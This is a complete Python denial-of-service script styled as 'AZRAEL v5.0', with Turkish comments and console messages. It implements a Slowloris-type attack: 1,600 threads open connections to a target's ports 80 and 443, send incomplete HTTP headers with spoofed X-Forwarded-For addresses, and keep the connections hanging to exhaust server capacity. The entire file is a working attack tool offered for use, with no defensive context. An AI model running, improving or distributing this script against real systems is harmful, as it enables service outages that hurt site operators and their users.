import socket, threading, sys, random, time, os

def get_headers(host):
    return [
        f"GET /?{random.getrandbits(16)} HTTP/1.1\r\n",
        f"Host: {host}\r\n",
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,100)}\r\n",
        f"Accept-language: en-US,en,q=0.5\r\n",
        f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
    ]

def attack(ip, port, host):
    # Bu metod sunucuyu meşgul tutmaya odaklanır
    sockets = []
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            
            headers = get_headers(host)
            s.send(headers[0].encode())
            for h in headers[1:]:
                s.send(h.encode())
            
            sockets.append(s)
            # Sunucuyu açık tutmaya zorla, ama veri gönderme
            while True:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.uniform(10, 15))
                except:
                    break
        except:
            time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit()
    target = sys.argv[1].replace("http://", "").replace("https://", "").split("/")[0]
    try:
        ip = socket.gethostbyname(target)
        os.system("clear")
        print("\033[1;91mAZRAEL v5.0 [COLD-BLOOD] - SİNSİ MOD AKTİF\033[0m")
        print(f"[*] Hedef: {target} | Isınma: DÜŞÜK | Etki: YÜKSEK")
        
        # Daha az ama daha etkili hat (800-1000 arası)
        for _ in range(800):
            threading.Thread(target=attack, args=(ip, 80, target), daemon=True).start()
            threading.Thread(target=attack, args=(ip, 443, target), daemon=True).start()
            
        while True:
            print(f"\033[92m\r[✔] Bağlantılar Askıda Tutuluyor... Sunucu Kapasitesi Zorlanıyor... \033[0m", end="")
            time.sleep(1)
    except:
        print("Bağlantı hatası!")
